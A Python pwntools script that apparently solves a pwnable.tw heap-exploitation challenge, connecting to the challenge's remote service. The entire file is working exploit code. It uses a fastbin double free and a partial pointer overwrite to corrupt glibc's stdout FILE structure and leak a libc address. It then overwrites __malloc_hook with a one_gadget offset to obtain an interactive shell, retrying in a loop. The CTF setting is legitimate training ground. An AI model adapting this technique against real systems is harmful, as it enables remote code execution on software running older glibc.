#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# context.update(binary=elf, log_level="debug")


def Allocate(size, data):
    p.sendlineafter(b"You Choice:", b"1")
    p.sendlineafter(b"Size :", str(int(size)).encode())
    p.sendafter(b"Data :", data)
    return


def Free(idx):
    p.sendlineafter(b"You Choice:", b"2")
    p.sendlineafter(b"Index :", str(idx).encode())
    return


def pwn(sh=None):
    Allocate(0x28, p64(0) * 3 + p64(0x31))  # 0
    Allocate(0x68, p64(0) * 3 + p64(0x31))  # 1
    Allocate(0x68, b"A")  # 2
    Allocate(0x28, b"A")  # 3

    Free(3)
    Free(0)
    Free(3)
    Free(1)

    Allocate(0x28, b"\x20")
    Allocate(0x28, b"abcd")
    Allocate(0x28, b"abcd")
    Allocate(0x28, p64(0) + p64(0xE1))  # 7
    Free(1)  # get unsorted bins
    Free(7)
    # recover size and write fd
    Allocate(0x28, p64(0) + p64(0x71) + p64(libc.symbols["_IO_2_1_stdout_"] - 0x43)[:2])
    Allocate(0x68, b"A")  # get old #1 (#9) push fd in fastbins 0x70
    Allocate(0x68, 0x33 * b"\x00" + p64(0xFBAD1800) * 4 + b"\x80")  # get FILE 10
    leak = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
    libc.address = leak - libc.symbols["_IO_2_1_stdin_"]
    log.info("leak value:              " + hex(leak))
    log.info("LIBC base address:       " + hex(libc.address))
    log.info("_IO_2_1_stdin_ address:  " + hex(libc.symbols["_IO_2_1_stdin_"]))
    log.info("_IO_2_1_stdout_ address: " + hex(libc.symbols["_IO_2_1_stdout_"]))

    # gdb.attach(
    #     p,
    #     """
    #     breakrva 0x0E0E
    #     breakrva 0x0E1A
    #     """,
    # )
    one = [0x45216, 0x4526A, 0xEF6C4, 0xF0567]
    one_gadget = one[2] + libc.address
    malloc_hook = libc.symbols["__malloc_hook"]

    Free(9)  # same as delete 1
    Free(7)  # same as delete 10

    Allocate(0x28, p64(0) + p64(0x71) + p64(malloc_hook - 0x23))
    Allocate(0x68, b"A")
    Allocate(0x68, 0x13 * b"A" + p64(one_gadget))

    p.sendlineafter(b"Choice:", b"1")
    p.sendlineafter(b"Size :", b"10")

    p.interactive()


if __name__ == "__main__":
    p = None
    while True:
        try:
            # p = elf.process()
            p = remote("chall.pwnable.tw", "10308")
            pwn(sh=p)
        except:
            p.close()
